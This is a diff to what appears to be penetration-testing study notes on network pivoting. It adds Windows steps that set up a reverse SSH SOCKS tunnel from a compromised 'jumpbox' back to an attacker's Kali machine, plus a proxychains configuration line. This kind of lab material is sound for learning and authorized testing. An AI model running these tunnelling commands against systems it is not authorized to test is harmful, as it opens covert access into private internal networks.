@@ -140,3 +140,19 @@ Example:
 ```bash
 sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
 ```
+# Windows
+## ssh.exe
+```batch
+where ssh
+```
+On the attacker machine:
+```bash
+sudo systemctl start ssh
+```
+```bash
+sudo echo "socks5 127.0.0.1 9998" >> /etc/proxychains4.conf
+```
+On the Windows jumpbox:
+```bash
+ssh -N -R 9998 kali@$(IP_ADDRESS)
+```
